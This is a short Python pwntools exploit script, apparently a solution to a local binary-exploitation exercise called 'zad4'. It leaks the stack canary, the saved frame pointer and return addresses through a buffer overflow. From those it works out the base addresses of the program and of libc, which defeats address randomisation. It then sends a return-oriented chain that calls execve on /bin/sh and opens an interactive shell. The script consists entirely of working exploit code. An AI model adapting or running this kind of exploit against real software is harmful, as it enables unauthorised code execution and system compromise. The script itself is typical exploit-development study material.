from pwn import *

p = process("./zad4")
p.send(b"a"*41)
buf = p.read(timeout=0.3)[41:]
canary = b"\0" + buf[:7]
addr_rbp = u64(buf[7:].ljust(8,b"\0"))
print("canary: ", enhex(canary))
print("addr rbp: ", hex(addr_rbp))

p.send(b"a"*56)
buf = p.read(timeout=0.3)[56:]
addr_ret_to_main = u64(buf.ljust(8,b"\0"))
print("addr ret to main:", hex(addr_ret_to_main))
base_zad4 = addr_ret_to_main - 0x1288
print("zad4:", hex(base_zad4))

p.send(b"a"*72)
buf = p.read(timeout=0.3)[72:]
addr_ret_to_libc = u64(buf.ljust(8,b"\0"))
print("addr ret to libc:", hex(addr_ret_to_libc))
base_libc = addr_ret_to_libc - 0x280d0
print("libc:", hex(base_libc))

# 0x0000000000046663 : pop rax ; ret
pop_rax_addr = base_libc + 0x46663
# 0x0000000000028715 : pop rdi ; ret
pop_rdi_addr = base_libc + 0x28715 
# 0x000000000002a671 : pop rsi ; ret
pop_rsi_addr = base_libc + 0x2a671
# 0x0000000000093359 : pop rdx ; pop rbx ; ret
pop_rdx_rbx_addr = base_libc + 0x93359
#  1c041b /bin/sh
binsh_addr = base_libc + 0x1c041b
# 0x000000000002686d : syscall
syscall_addr = base_libc + 0x2686d
#gdb.attach(p)
#input("press enter to pwn")
p.send(
    b"exit\0".ljust(40,b"a") +
    canary + 
    p64(addr_rbp) +
    p64(pop_rax_addr) +
    p64(59) +
    p64(pop_rdi_addr) +
    p64(binsh_addr) +
    p64(pop_rsi_addr) +
    p64(0) +
    p64(pop_rdx_rbx_addr) +
    p64(0) +
    p64(0) +
    p64(syscall_addr)
)
p.interactive()


